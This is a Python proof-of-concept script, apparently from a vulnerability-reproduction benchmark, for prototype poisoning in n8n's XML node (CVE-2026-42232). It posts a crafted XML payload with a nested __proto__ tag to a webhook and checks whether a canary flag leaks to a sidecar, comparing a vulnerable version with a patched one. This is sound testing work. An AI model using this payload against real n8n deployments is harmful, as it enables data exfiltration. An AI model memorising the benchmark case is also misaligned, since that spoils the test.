#!/usr/bin/env python3
"""original_poc.py — CVE-2026-42232 seed (XML node <__proto__> tag prototype poisoning).

The XML node converts attacker XML to JSON with xml2js. A nested tag literally named
`__proto__` becomes an OWN '__proto__' property of the parsed object (xml2js uses
Object.defineProperty, bypassing the prototype setter). n8n-workflow's deepCopy then
executes `clone['__proto__'] = copiedValue` — an OBJECT assignment through the setter —
so the output item's PROTOTYPE becomes the attacker's element object. A following node's
expression `$json.root[1].pcb_seed_flag` resolves the planted value through the prototype
chain and exfiltrates it to the sidecar (benign benchmark canary token, no real payload).

V0 (2.17.3): no sanitizer -> pollution -> flag reaches the sidecar.
V1 (2.20.6): sanitizeXmlName renames __proto__ -> no pollution -> flag absent.
"""
import json
import os
import secrets
import sys
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent
CASE_DIR = HERE.parent
sys.path.insert(0, str(CASE_DIR))
import n8n_util as u  # noqa: E402

FLAG = os.environ.get("PCB_FLAG") or f"PCBFLAG_{secrets.token_hex(8)}"
FLAG_KEY = "pcb_seed_flag"


def original_poc(*, version="v0") -> dict:
    if not u.wait_ready(version):
        return {"ok": False, "status": 0, "text": "env not ready", "hits": []}
    path = f"sd{int(time.time())}"
    wf = u.make_seed_workflow(path, FLAG_KEY, FLAG)
    try:
        p = u.create_active_workflow(version, wf)
    except Exception as e:
        return {"ok": False, "status": 0, "text": f"create failed: {e}", "hits": []}
    xml = f"<root><__proto__><{FLAG_KEY}>{FLAG}</{FLAG_KEY}></__proto__></root>"
    r = requests_post_text(version, p, xml)
    ok = u.wait_for_hit(str(CASE_DIR / "sidecar_hits.json"), f"seed={FLAG}", timeout=180)
    hits = u.sidecar_hits(str(CASE_DIR / "sidecar_hits.json"))
    return {"ok": ok, "status": r["status"], "text": r["text"][:200], "hits": hits[-4:]}


def requests_post_text(version: str, path: str, xml: str) -> dict:
    try:
        import requests
        r = requests.post(u.BASE[version] + "/webhook/" + path, data=xml,
                          headers={"Content-Type": "text/plain"}, timeout=90)
        return {"status": r.status_code, "text": r.text}
    except Exception as e:
        return {"status": 0, "text": str(e)}


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v0"
    print(json.dumps(original_poc(version=v), indent=2))
